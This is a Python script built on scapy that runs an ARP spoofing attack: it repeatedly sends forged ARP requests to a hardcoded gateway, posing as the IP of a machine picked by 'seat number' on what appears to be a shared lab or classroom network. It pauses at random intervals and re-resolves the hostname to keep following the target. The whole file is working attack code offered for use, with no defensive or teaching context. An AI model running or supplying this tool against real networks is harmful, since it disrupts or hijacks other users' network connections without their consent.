import os
import time
import random
from scapy.all import *

gatewayIP = '192.168.170.254'
sendInter = 0.5
packetCount = 8
sleepInter = (30, 60)


def arpattack(gatewayIP, targetIP, hostName):
    print('[Info] Attack start, target hostname:', hostName)
    time.sleep(5)
    while True:
        exitIndicator = False
        while exitIndicator == False:
            print('[Info] Target IP:', targetIP)
            pkt = ARP(psrc=targetIP, pdst=gatewayIP, op=1)
            srloop(pkt, inter=sendInter, count=packetCount)
            print('[Info] Waiting for the next packet transmission...')
            sleepTime = random.randint(*sleepInter)
            print('[Debug] Intermittent:', sleepTime)
            time.sleep(sleepTime)
            try:
                newIP = socket.gethostbyname(hostName)
            except:
                print('[Warning] Unable to resolve host')
            if newIP != targetIP:
                exitIndicator = True
                print('[Warning] Target IP changed from', targetIP, 'to', newIP)
        targetIP = newIP


def main():
    stat = 1
    while stat != 0:
        hostName = input('Please enter seat number: ')
        stat = 0
        if hostName == 'exit':
            print('[Info] Exit')
            return (2)
    try:
        targetIP = socket.gethostbyname(hostName)
        print('[Info] Target IP:', targetIP)

    except Exception as e:
        print('[Fatal] {}'.format(e))
        return (1)

    try:
        arpattack(gatewayIP, targetIP, hostName)

    except KeyboardInterrupt:
        print('[Info] Break')
        return (1)
    except Exception as f:
        print('[Fatal] {}'.format(f))
        return (1)


if __name__ == '__main__':
    while True:
        if main() == 2:
            print('[Info] Exit')
            break